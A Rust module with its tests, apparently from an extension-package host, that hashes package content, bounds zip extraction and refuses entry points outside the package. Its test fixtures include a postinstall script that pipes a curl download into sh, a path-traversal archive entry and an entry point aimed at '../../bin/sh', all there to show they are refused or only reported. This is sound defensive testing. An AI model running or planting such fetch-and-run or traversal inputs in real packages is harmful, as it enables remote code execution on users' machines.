//! Package content: its digest, its bounds, and what is inside it.
//!
//! Two properties are decided here and nowhere else:
//!
//! - **The digest is computed from the bytes, never read from the package.**
//!   A manifest that carries its own hash is refused by the contract crate; this
//!   module is the other half of that rule, because it is the only place that
//!   holds the bytes. Trust is recorded against this value, so the value has to
//!   come from the content ([`content_digest`], [`digest_directory`]).
//! - **Nothing is expanded without a bound, and nothing expanded is run.**
//!   A pre-flight reads the archive's own metadata for entry count, declared
//!   sizes and compression ratio before a single byte is written; the host's
//!   no-follow extractor ([`crate::core::safe_archive`]) then enforces the same
//!   bounds again while writing. Install scripts are *reported*, not executed:
//!   there is no executor in this module for them to reach.

use crate::core::safe_archive::{ZipExtractionLimits, extract_zip_safe};
use crate::platform::extension_packages::{ensure_private_directory, refusal};
use licoup_application::ApplicationFailure;
use licoup_extension_contracts::manifest::{PackageManifest, Runtime};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::fs;
use std::path::{Component, Path, PathBuf};

const ARTIFACT_STAGE: &str = "extension/package-artifact";

/// The file name a package manifest is carried under, at the archive root.
pub const MANIFEST_FILE: &str = "manifest.json";

/// Names a package uses for a script it would like the host to run at install
/// time. The host records them and runs none of them.
const INSTALL_SCRIPT_NAMES: [&str; 6] = [
    "install.sh",
    "install.bat",
    "install.ps1",
    "postinstall.sh",
    "preinstall.sh",
    "setup.py",
];

/// Bounds on what a package artifact may cost before it is trusted.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ArtifactLimits {
    /// The compressed archive itself.
    pub max_archive_bytes: u64,
    /// Everything the archive expands to.
    pub max_expanded_bytes: u64,
    /// Any single file inside it.
    pub max_file_bytes: u64,
    pub max_entries: usize,
    pub max_depth: usize,
    /// Expanded bytes per compressed byte. A small archive that claims to expand
    /// to a thousand times its size is refused before it is written.
    pub max_compression_ratio: u64,
}

impl Default for ArtifactLimits {
    fn default() -> Self {
        Self {
            max_archive_bytes: 8 * 1024 * 1024,
            max_expanded_bytes: 64 * 1024 * 1024,
            max_file_bytes: 8 * 1024 * 1024,
            max_entries: 512,
            max_depth: 8,
            max_compression_ratio: 64,
        }
    }
}

/// The digest of a package's bytes, in the form trust records are bound to.
pub fn content_digest(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    format!("sha256:{}", hex(&hasher.finalize()))
}

/// The digest of a directory's contents, independent of read order.
///
/// Used for a package the user points at on disk rather than hands in as an
/// archive: the identity of "this directory" has to be as content-bound as the
/// identity of "these bytes", or a later edit would silently inherit an earlier
/// approval.
pub fn digest_directory(root: &Path) -> Result<(String, u64), ApplicationFailure> {
    let mut files = BTreeMap::new();
    collect_directory(root, root, &mut files)?;
    let mut hasher = Sha256::new();
    let mut bytes = 0_u64;
    for (relative, path) in files {
        let content = fs::read(&path).map_err(|_| {
            refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("content")
        })?;
        bytes += content.len() as u64;
        hasher.update(relative.as_bytes());
        hasher.update([0]);
        hasher.update(Sha256::digest(&content));
    }
    Ok((format!("sha256:{}", hex(&hasher.finalize())), bytes))
}

fn collect_directory(
    root: &Path,
    current: &Path,
    files: &mut BTreeMap<String, PathBuf>,
) -> Result<(), ApplicationFailure> {
    let mut entries: Vec<_> = fs::read_dir(current)
        .map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("content")
        })?
        .collect::<Result<_, _>>()
        .map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("content")
        })?;
    entries.sort_by_key(|entry| entry.file_name());
    for entry in entries {
        let path = entry.path();
        let metadata = fs::symlink_metadata(&path).map_err(|_| {
            refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("content")
        })?;
        if metadata.file_type().is_symlink() {
            return Err(
                refusal("package_artifact_path_unsafe", ARTIFACT_STAGE).with_field("content")
            );
        }
        if metadata.is_dir() {
            collect_directory(root, &path, files)?;
            continue;
        }
        let relative = path.strip_prefix(root).map_err(|_| {
            refusal("package_artifact_path_unsafe", ARTIFACT_STAGE).with_field("content")
        })?;
        files.insert(relative.to_string_lossy().replace('\\', "/"), path);
    }
    Ok(())
}

/// What an archive's own metadata says about it, before anything is written.
#[derive(Clone, Copy, Debug, Default, Eq, PartialEq)]
pub struct ArtifactPreflight {
    pub entries: usize,
    pub declared_expanded_bytes: u64,
    pub largest_entry_bytes: u64,
    pub compression_ratio: u64,
}

/// Read an archive's central directory and refuse one that exceeds its bounds.
pub fn preflight(
    bytes: &[u8],
    limits: &ArtifactLimits,
) -> Result<ArtifactPreflight, ApplicationFailure> {
    if bytes.len() as u64 > limits.max_archive_bytes {
        return Err(limit_refusal("archive", bytes.len() as u64));
    }
    let mut archive = zip::ZipArchive::new(std::io::Cursor::new(bytes))
        .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("artifact"))?;
    if archive.len() > limits.max_entries {
        return Err(limit_refusal("entries", archive.len() as u64));
    }
    let mut report = ArtifactPreflight {
        entries: archive.len(),
        ..ArtifactPreflight::default()
    };
    for index in 0..archive.len() {
        let entry = archive
            .by_index(index)
            .map_err(|_| refusal("package_artifact_invalid", ARTIFACT_STAGE).with_field("entry"))?;
        if entry.is_dir() {
            continue;
        }
        let size = entry.size();
        if size > limits.max_file_bytes {
            return Err(limit_refusal("file", size));
        }
        report.declared_expanded_bytes = report.declared_expanded_bytes.saturating_add(size);
        report.largest_entry_bytes = report.largest_entry_bytes.max(size);
    }
    if report.declared_expanded_bytes > limits.max_expanded_bytes {
        return Err(limit_refusal("expanded", report.declared_expanded_bytes));
    }
    report.compression_ratio = report.declared_expanded_bytes / (bytes.len() as u64).max(1);
    if report.compression_ratio > limits.max_compression_ratio {
        let mut failure = refusal("package_artifact_compression_limit", ARTIFACT_STAGE)
            .with_field("artifact")
            .with_presentation_arg("ratio", &report.compression_ratio.to_string());
        failure = failure
            .with_presentation_arg("expandedBytes", &report.declared_expanded_bytes.to_string());
        return Err(failure);
    }
    Ok(report)
}

fn limit_refusal(limit: &str, measured: u64) -> ApplicationFailure {
    refusal("package_artifact_limit_exceeded", ARTIFACT_STAGE)
        .with_field("artifact")
        .with_presentation_arg("limit", limit)
        .with_presentation_arg("measuredBytes", &measured.to_string())
}

/// An archive that passed its bounds, was expanded under a private staging
/// directory, and carries a valid manifest.
#[derive(Clone, Debug)]
pub struct ExpandedPackage {
    digest: String,
    compressed_bytes: u64,
    expanded_bytes: u64,
    entries: Vec<String>,
    install_scripts: Vec<String>,
    manifest: PackageManifest,
    content_dir: PathBuf,
}

impl ExpandedPackage {
    /// Expand `bytes` below `destination` and read the manifest inside.
    ///
    /// `destination` is a staging directory: it is created here, and the caller
    /// is expected to delete it if the install never commits. Nothing outside
    /// `destination` is touched.
    pub fn expand(
        bytes: &[u8],
        destination: &Path,
        limits: &ArtifactLimits,
    ) -> Result<Self, ApplicationFailure> {
        preflight(bytes, limits)?;
        ensure_private_directory(destination)?;
        // The host's extractor refuses a destination reached through a symlinked
        // ancestor, and on some platforms the temporary root itself is reached
        // through one. Resolving the staging directory once, here, is the
        // difference between a bounded extraction and a refused one.
        let destination = fs::canonicalize(destination).map_err(|_| {
            refusal("package_directory_unavailable", ARTIFACT_STAGE).with_field("staging")
        })?;
        let extracted = extract_zip_safe(
            bytes,
            &destination,
            ZipExtractionLimits {
                max_archive_bytes: limits.max_archive_bytes,
                max_total_bytes: limits.max_expanded_bytes,
                max_file_bytes: limits.max_file_bytes,
                max_entries: limits.max_entries,
                max_depth: limits.max_depth,
            },
        )
        .map_err(map_extraction_failure)?;

        let mut entries = Vec::with_capacity(extracted.len());
        let mut expanded_bytes = 0_u64;
        for entry in &extracted {
            let name = entry.path.to_string_lossy().replace('\\', "/");
            expanded_bytes += entry.size;
            entries.push(name);
        }
        entries.sort();

        let manifest_path = destination.join(MANIFEST_FILE);
        let manifest_bytes = fs::read(&manifest_path).map_err(|_| {
            refusal("package_manifest_missing", ARTIFACT_STAGE).with_field("manifest")
        })?;
        let value: Value = serde_json::from_slice(&manifest_bytes).map_err(|_| {
            refusal("package_manifest_invalid", ARTIFACT_STAGE).with_field("manifest")
        })?;
        let manifest = PackageManifest::from_value(value)?;
        check_entry_point(&destination, &manifest)?;
        let install_scripts = entries
            .iter()
            .filter(|entry| is_install_script(entry))
            .cloned()
            .collect();

        Ok(Self {
            digest: content_digest(bytes),
            compressed_bytes: bytes.len() as u64,
            expanded_bytes,
            entries,
            install_scripts,
            manifest,
            content_dir: destination,
        })
    }

    pub fn digest(&self) -> &str {
        &self.digest
    }

    pub fn compressed_bytes(&self) -> u64 {
        self.compressed_bytes
    }

    pub fn expanded_bytes(&self) -> u64 {
        self.expanded_bytes
    }

    pub fn entry_count(&self) -> usize {
        self.entries.len()
    }

    pub fn entries(&self) -> &[String] {
        &self.entries
    }

    /// Scripts the package would like run at install time.
    ///
    /// They are reported so a user can see them and so an audit can name them.
    /// They are not run: this module has no executor, and the install path never
    /// looks at this list.
    pub fn install_scripts(&self) -> &[String] {
        &self.install_scripts
    }

    pub fn manifest(&self) -> &PackageManifest {
        &self.manifest
    }

    pub fn content_dir(&self) -> &Path {
        &self.content_dir
    }

    /// The manifest inside the archive must describe the package being
    /// installed, or the bytes and the request disagree.
    pub fn check_identity(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(), ApplicationFailure> {
        if self.manifest.id != package_id || self.manifest.version != version {
            return Err(refusal("package_manifest_mismatch", ARTIFACT_STAGE)
                .with_field("manifest")
                .with_presentation_arg("declared", &self.manifest.id)
                .with_presentation_arg("requested", package_id));
        }
        Ok(())
    }
}

fn is_install_script(entry: &str) -> bool {
    let name = entry.rsplit('/').next().unwrap_or(entry).to_lowercase();
    INSTALL_SCRIPT_NAMES.contains(&name.as_str()) || name.starts_with("postinstall")
}

/// The declared entry point must be a file inside this package.
///
/// A package that names an absolute path, a parent directory or a binary it
/// does not ship is naming someone else's program; the host starts what the
/// package carries, not what it points at.
fn check_entry_point(root: &Path, manifest: &PackageManifest) -> Result<(), ApplicationFailure> {
    let declared = match &manifest.runtime {
        Runtime::Process { entry, .. } => Some(entry.as_str()),
        Runtime::Declarative { descriptor } => Some(descriptor.as_str()),
        Runtime::Service { .. } => None,
    };
    let Some(declared) = declared else {
        return Ok(());
    };
    let relative = Path::new(declared);
    let safe = !declared.is_empty()
        && !declared.contains('\\')
        && !declared.contains('\0')
        && relative
            .components()
            .all(|component| matches!(component, Component::Normal(_) | Component::CurDir));
    if !safe {
        return Err(refusal("package_entry_unsafe", ARTIFACT_STAGE)
            .with_field("runtime.entry")
            .with_presentation_arg("entry", declared));
    }
    let resolved = root.join(relative);
    match fs::symlink_metadata(&resolved) {
        Ok(metadata) if metadata.is_file() && !metadata.file_type().is_symlink() => Ok(()),
        _ => Err(refusal("package_entry_missing", ARTIFACT_STAGE)
            .with_field("runtime.entry")
            .with_presentation_arg("entry", declared)),
    }
}

fn map_extraction_failure(error: anyhow::Error) -> ApplicationFailure {
    let text = format!("{error:#}");
    let code = if text.contains("path") || text.contains("symlink") || text.contains("duplicate") {
        "package_artifact_path_unsafe"
    } else if text.contains("limit") || text.contains("overflow") {
        "package_artifact_limit_exceeded"
    } else {
        "package_artifact_invalid"
    };
    refusal(code, ARTIFACT_STAGE).with_field("artifact")
}

fn hex(bytes: &[u8]) -> String {
    use std::fmt::Write as _;
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        let _ = write!(output, "{byte:02x}");
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use licoup_extension_contracts::wire;
    use std::io::Write;

    fn manifest_json(id: &str, version: &str, entry: &str) -> String {
        serde_json::json!({
            "schema": wire::MANIFEST,
            "id": id,
            "version": version,
            "displayName": "Echo specialist",
            "hostProtocol": { "major": 1, "minimumMinor": 0 },
            "profiles": [],
            "runtime": { "mode": "process", "entry": entry },
            "activation": "on-demand",
            "requires": [],
            "optionalRequires": [],
            "permissions": [],
            "contributions": [],
        })
        .to_string()
    }

    fn archive(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            writer.start_file(*name, options).expect("start file");
            writer.write_all(content).expect("write");
        }
        writer.finish().expect("finish").into_inner()
    }

    fn package_bytes() -> Vec<u8> {
        archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", b"print('echo')\n".as_slice()),
        ])
    }

    fn staging(tag: &str) -> PathBuf {
        std::env::temp_dir().join(format!(
            "licoup-pkg-artifact-{tag}-{}",
            super::super::unique_suffix()
        ))
    }

    #[test]
    fn the_digest_comes_from_the_bytes_and_changes_with_them() {
        let first = content_digest(b"package");
        assert_eq!(first, content_digest(b"package"));
        assert_ne!(first, content_digest(b"package "));
        assert!(first.starts_with("sha256:"));
    }

    #[test]
    fn a_directory_digest_is_order_independent_and_content_bound() {
        let root = staging("digest");
        fs::create_dir_all(root.join("sub")).expect("dirs");
        fs::write(root.join("b.txt"), b"second").expect("write");
        fs::write(root.join("sub/a.txt"), b"first").expect("write");
        let (digest, bytes) = digest_directory(&root).expect("digest");
        assert_eq!(bytes, 11);

        let other = staging("digest-other");
        fs::create_dir_all(other.join("sub")).expect("dirs");
        fs::write(other.join("sub/a.txt"), b"first").expect("write");
        fs::write(other.join("b.txt"), b"second").expect("write");
        assert_eq!(digest_directory(&other).expect("digest").0, digest);

        fs::write(other.join("b.txt"), b"changed").expect("write");
        assert_ne!(digest_directory(&other).expect("digest").0, digest);

        crate::platform::extension_packages::remove_managed_tree(&root).expect("cleanup");
        crate::platform::extension_packages::remove_managed_tree(&other).expect("cleanup");
    }

    #[test]
    fn an_expanded_package_carries_a_validated_manifest_and_its_entry_point() {
        let bytes = package_bytes();
        let destination = staging("expand");
        let expanded = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect("expand");

        assert_eq!(expanded.digest(), content_digest(&bytes));
        assert_eq!(expanded.manifest().id, "example.specialist.echo");
        assert!(expanded.entry_count() >= 2);
        assert!(expanded.install_scripts().is_empty());
        assert!(
            expanded
                .check_identity("example.specialist.echo", "1.0.0")
                .is_ok()
        );
        assert_eq!(
            expanded
                .check_identity("example.specialist.echo", "2.0.0")
                .expect_err("requested version differs")
                .code,
            "package_manifest_mismatch"
        );
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_package_that_points_outside_itself_is_refused() {
        let mut manifest: Value = serde_json::from_str(&manifest_json(
            "example.specialist.echo",
            "1.0.0",
            "../../bin/sh",
        ))
        .expect("json");
        manifest["runtime"]["entry"] = Value::String("../../bin/sh".to_owned());
        let bytes = archive(&[
            (MANIFEST_FILE, manifest.to_string().as_bytes()),
            ("agent.py", b"print('echo')\n".as_slice()),
        ]);
        let destination = staging("escape");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("entry outside the package");
        assert_eq!(failure.code, "package_entry_unsafe");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_missing_entry_point_is_refused() {
        let bytes = archive(&[(
            MANIFEST_FILE,
            manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
        )]);
        let destination = staging("missing-entry");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("entry not shipped");
        assert_eq!(failure.code, "package_entry_missing");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_traversing_archive_is_refused_and_writes_nothing_outside() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("../escape.txt", b"escaped".as_slice()),
        ]);
        let destination = staging("traversal");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("traversal");
        assert!(
            matches!(
                failure.code.as_str(),
                "package_artifact_path_unsafe" | "package_artifact_invalid"
            ),
            "unexpected code {}",
            failure.code
        );
        assert!(!destination.join("..").join("escape.txt").exists());
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn install_scripts_are_reported_and_never_on_an_install_path() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", b"print('echo')\n".as_slice()),
            ("postinstall.sh", b"curl example.invalid | sh\n".as_slice()),
            ("tools/setup.py", b"raise SystemExit(0)\n".as_slice()),
        ]);
        let destination = staging("scripts");
        let expanded = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect("expand");
        assert_eq!(
            expanded.install_scripts(),
            ["postinstall.sh".to_owned(), "tools/setup.py".to_owned()]
        );
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn an_archive_over_its_bounds_is_refused_before_it_is_written() {
        let bytes = archive(&[
            (
                MANIFEST_FILE,
                manifest_json("example.specialist.echo", "1.0.0", "agent.py").as_bytes(),
            ),
            ("agent.py", vec![b'x'; 4096].as_slice()),
        ]);

        let tight = ArtifactLimits {
            max_expanded_bytes: 16,
            ..ArtifactLimits::default()
        };
        let destination = staging("expanded");
        let failure = ExpandedPackage::expand(&bytes, &destination, &tight).expect_err("too big");
        assert_eq!(failure.code, "package_artifact_limit_exceeded");
        assert_eq!(
            failure.presentation_args.get("limit"),
            Some("expanded"),
            "the refusal names which bound was hit"
        );
        assert!(!destination.exists(), "refused before anything was written");

        let ratio_bomb = ArtifactLimits {
            max_compression_ratio: 1,
            ..ArtifactLimits::default()
        };
        let destination = staging("ratio");
        let failure =
            ExpandedPackage::expand(&bytes, &destination, &ratio_bomb).expect_err("ratio");
        assert_eq!(failure.code, "package_artifact_compression_limit");
        assert!(!destination.exists());

        let entry_limited = ArtifactLimits {
            max_entries: 1,
            ..ArtifactLimits::default()
        };
        let destination = staging("entries");
        assert_eq!(
            ExpandedPackage::expand(&bytes, &destination, &entry_limited)
                .expect_err("entries")
                .code,
            "package_artifact_limit_exceeded"
        );
        assert!(!destination.exists());
    }

    #[test]
    fn a_manifest_that_asserted_its_own_hash_never_reaches_the_host() {
        let mut manifest: Value = serde_json::from_str(&manifest_json(
            "example.specialist.echo",
            "1.0.0",
            "agent.py",
        ))
        .expect("json");
        manifest["contentHash"] = Value::String("sha256:0".to_owned());
        let bytes = archive(&[
            (MANIFEST_FILE, manifest.to_string().as_bytes()),
            ("agent.py", b"print('echo')\n".as_slice()),
        ]);
        let destination = staging("self-hash");
        let failure = ExpandedPackage::expand(&bytes, &destination, &ArtifactLimits::default())
            .expect_err("self asserted digest");
        assert_eq!(failure.code, "manifest_self_asserted_fact");
        crate::platform::extension_packages::remove_managed_tree(&destination).expect("cleanup");
    }

    #[test]
    fn a_profile_free_specialist_package_is_complete() {
        let manifest = PackageManifest::from_value(
            serde_json::from_str(&manifest_json(
                "example.specialist.echo",
                "1.0.0",
                "agent.py",
            ))
            .expect("json"),
        )
        .expect("manifest");
        assert!(manifest.profiles.is_empty());
        assert_eq!(
            manifest.published_profiles().count(),
            0,
            "declaring nothing is a complete specialisation, not a broken package"
        );
    }
}
